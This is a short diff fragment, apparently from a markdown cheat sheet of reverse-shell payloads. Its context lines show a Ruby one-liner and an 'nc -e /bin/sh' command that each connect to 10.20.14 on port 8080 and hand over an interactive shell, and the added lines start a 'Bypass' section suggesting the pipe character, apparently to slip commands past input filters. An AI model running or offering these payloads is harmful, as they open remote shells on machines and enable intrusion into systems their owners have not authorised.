@@ -31,3 +31,6 @@ ruby -rsocket -e'f=TCPSocket.open("10.20.14",8080).to_i;exec sprintf("/bin/sh -i
 ```cmd
 nc -e /bin/sh 10.20.14 8080
 ```
+
+## Bypass
+- Use ```|```
